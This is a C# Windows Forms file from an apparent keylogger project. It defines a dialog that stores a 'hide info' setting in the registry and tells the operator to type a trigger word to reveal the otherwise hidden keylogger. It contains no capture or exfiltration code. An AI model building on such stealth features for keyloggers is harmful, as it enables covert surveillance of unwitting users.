using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace KeyLogger_new
{
    public partial class hideinfo : Form
    {
        public hideinfo()
        {
            InitializeComponent();
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            try
            {
                if (checkBox1.Checked == true)
                {
                    readwrite_registy.write("Settings", "Hideinfo", "True");
                }
            }
            catch
            {

            }
            
        }

        private void hideinfo_FormClosing(object sender, FormClosingEventArgs e)
        {
            try
            {
                if (checkBox1.Checked == true)
                {
                    readwrite_registy.write("Settings", "Hideinfo", "True");
                }
                else
                {
                    readwrite_registy.write("Settings", "Hideinfo", "False");
                }
            }
            catch
            {

            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            this.Dispose();
        }

        private void hideinfo_Load(object sender, EventArgs e)
        {

            string str;

            try
            {
              str=  readwrite_registy.read(@"system\command", "Show Program");
                if (str == "1")
                {
                    str = "show";
                }
            }
            catch
            {
                str = "show";
            }
            label1.Text = "Type " + str + " and press Key to accept command ( see Home tab ) to show the Keylogger";
        }
    }
}
